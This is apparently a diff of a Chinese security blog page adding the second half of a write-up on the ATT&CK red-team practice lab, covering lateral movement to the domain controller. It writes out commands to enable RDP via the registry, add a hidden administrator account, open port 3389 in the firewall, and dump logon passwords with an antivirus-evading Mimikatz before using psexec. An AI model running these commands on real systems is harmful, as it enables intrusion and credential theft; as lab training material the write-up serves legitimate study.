+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173655892.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173657996.png" alt="图片"></p>
+<p>同样的方法依然可以获取192.168.52.141的shell</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173703265.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173706088.png" alt="图片"></p>
+<p>  至此，内网渗透完毕，已经成功获取所有主机的权限，实际上真的有这么简单🐎？ 其实之前能够这么快获得所有主机的权限，是因为我的得到了域管理员的账号密码，但是在实际情况下，基本上是不可能的，只是这里的靶机故意而为之，所以真正的内网渗透并没有这么容易。当然从这里也知道了，拿域控的关键还是在于获取域控主机管理员的账号和密码。</p>
+<h2 id="0x04-基于rdp形式的内网渗透"><a href="#0x04-基于rdp形式的内网渗透" class="headerlink" title="0x04 基于rdp形式的内网渗透"></a>0x04 基于rdp形式的内网渗透</h2><p>上面基本上都是在cs一套流程走完的，但是在真实的环境中，一般都是会有一些杀毒软件的，如果您不会免杀，木马根本没法在cs上上线，所以这个时候也可以通过一些其他的办法来进行操作。</p>
+<ol>
+<li>可以发现目标机未开放338端口，所以我们可以先开启3389端口</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">#启动 3389端口REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173720678.png" alt="图片"></p>
+<ol start="2">
+<li>添加一个管理员权限的用户</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">#添加用户并把用户加入管理组net user test1 test.123 &#x2F;addnet localgroup administrators test1 &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173722800.png" alt="图片"></p>
+<ol start="3">
+<li><p>但是发现并不能登陆3389，因为目标机开启了防火墙，所以我们得关掉防火墙或者添加一条3389的入站规则。但是执行防火墙的操作必须得是sytem权限，所以这里还是得提权，这里用getSytem.exe这个提权工具即可轻松以system权限执行命令。</p>
+<p>(ps: 也可以通过正向代理的方式进行登陆，下节靶机内容再用这个方法）</p>
+</li>
+</ol>
+<blockquote>
+<p>netsh advfirewall firewall add rule name=”Open 3389” dir=in action=allow protocol=TCP localport=3389</p>
+</blockquote>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173725096.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173726769.png" alt="图片"></p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173728697.png" alt="图片"></p>
+<ol start="4">
+<li>利用免杀版的Mimikatz来获取账号密码（因为我这个是交互式的，所以必须得登陆3389才行）</li>
+</ol>
+<blockquote>
+<p>mimikatz</p>
+<p>#log mimikatz </p>
+<p>#privilege::debug mimikatz </p>
+<p>#sekurlsa::logonpasswords</p>
+</blockquote>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173731422.png" alt="图片"></p>
+<p>大功告成，用psexec来登陆域控主机啦</p>
+<p><img src="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/640-20210415173733179.png" alt="图片"></p>
+<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>  域渗透（不谈维权和痕迹擦除等）主要目的为了拿到域管理员的密码 ，然后登录域控。</p>
+<p>  人生漫漫其修远兮，网安无止境。</p>
 
                 
             </div>
@@ -481,7 +745,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://rhacker.cn/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/">http://rhacker.cn/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/</a>
+                    <a href="http://rhacker.cn/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/">http://rhacker.cn/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -521,10 +785,6 @@
                             
                                 <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                                     <span class="chip bg-color">内网渗透</span>
-                                </a>
-                            
-                                <a href="/tags/docker/">
-                                    <span class="chip bg-color">docker</span>
                                 </a>
                             
                         </div>
@@ -695,7 +955,7 @@
         repo: '',
         owner: '',
         admin: null,
-        id: '2021-04-15T10-34-04',
+        id: '2021-04-15T17-07-25',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -723,70 +983,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/04/15/2021%E5%B9%B4%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E7%BA%A2%E5%90%8D%E8%B0%B7%E6%9D%AF-wp/">
+                <a href="/2021/04/15/ATT-CK-%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%E6%BC%94%E4%B9%A0%E5%BF%83%E5%BE%97%E7%AC%94%E8%AE%B0-%E4%B8%80/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="2021年数字中国创新大赛-红名谷杯WP">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="ATT&amp;CK 红日靶场实战演习心得笔记(一)">
                         
-                        <span class="card-title">2021年数字中国创新大赛-红名谷杯WP</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-15
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Reverse/">
-                        <span class="chip bg-color">Reverse</span>
-                    </a>
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/04/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bdocker%E9%80%83%E9%80%B8%E8%87%B3%E5%9F%9F%E6%8E%A7/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="内网渗透之docker逃逸至域控">
-                        
-                        <span class="card-title">内网渗透之docker逃逸至域控</span>
+                        <span class="card-title">ATT&amp;CK 红日靶场实战演习心得笔记(一)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -819,8 +1027,65 @@
                         <span class="chip bg-color">内网渗透</span>
                     </a>
                     
-                    <a href="/tags/docker/">
-                        <span class="chip bg-color">docker</span>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/04/15/2021%E5%B9%B4%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B-%E8%99%8E%E7%AC%A6WP/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="2021年数字中国创新大赛-虎符WP">
+                        
+                        <span class="card-title">2021年数字中国创新大赛-虎符WP</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Reverse/">
+                        <span class="chip bg-color">Reverse</span>
+                    </a>
+                    
+                    <a href="/tags/Web/">
+                        <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/Crypto/">
+                        <span class="chip bg-color">Crypto</span>
+                    </a>
+                    
+                    <a href="/tags/Misc/">
+                        <span class="chip bg-color">Misc</span>
                     </a>
                     
                 </div>
